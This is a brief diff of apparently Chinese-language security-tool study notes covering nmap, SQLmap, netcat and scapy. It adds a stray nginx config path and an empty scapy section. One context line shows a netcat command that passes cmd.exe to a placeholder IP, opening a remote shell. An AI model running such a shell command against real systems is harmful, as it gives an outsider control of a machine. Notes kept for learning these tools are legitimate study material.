@@ -52,6 +52,10 @@ nmap：一款端口扫描工具
 
 ## SQLmap
 
+nginx /etc/nginx/nginx.conf
+
+
+
 一款sql注入测试工具
 
 
@@ -217,4 +221,16 @@ nc -nv [ip] [端口] -e cmd.exe
 
 >- -l:将nc监听模式运行
 >- -k:接受一个请求不会结束而是继续监听
->-  
+
+
+
+
+
+## scapy
+
+
+
+构建一个IP数据包
+
+
+
